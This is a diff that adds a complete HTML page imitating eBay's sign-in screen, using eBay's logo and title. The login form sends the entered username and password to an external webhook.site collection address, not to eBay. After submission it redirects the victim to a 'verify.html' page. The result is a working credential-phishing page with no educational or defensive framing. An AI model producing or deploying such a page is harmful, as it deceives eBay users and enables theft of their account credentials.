@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in or Register | eBay</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="font-family: sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg" alt="eBay" width="120" style="margin-top: 50px; margin-bottom: 40px;">
+    <div style="width: 100%; max-width: 350px;">
+        <h1 style="font-size: 25px; font-weight: bold; margin-bottom: 8px;">Hello</h1>
+        <p style="font-size: 14px; margin-bottom: 25px;">Sign in to eBay or <a href="#" style="color: #0654ba; text-decoration: none;">create an account</a></p>
+        <form action="https://webhook.site/7a1a62c2-5de4-494f-ab08-dca442324eeb" method="POST" onsubmit="setTimeout(function(){window.location.href='verify.html'}, 500)">
+            <input type="text" name="user" placeholder="Email or username" required style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #707070; border-radius: 8px; box-sizing: border-box; font-size: 16px;">
+            <input type="password" name="pass" placeholder="Password" required style="width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #707070; border-radius: 8px; box-sizing: border-box; font-size: 16px;">
+            <button type="submit" style="width: 100%; background: #0053a0; color: white; padding: 12px; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer;">Sign in</button>
+        </form>
+    </div>
+</body>
+</html>
+
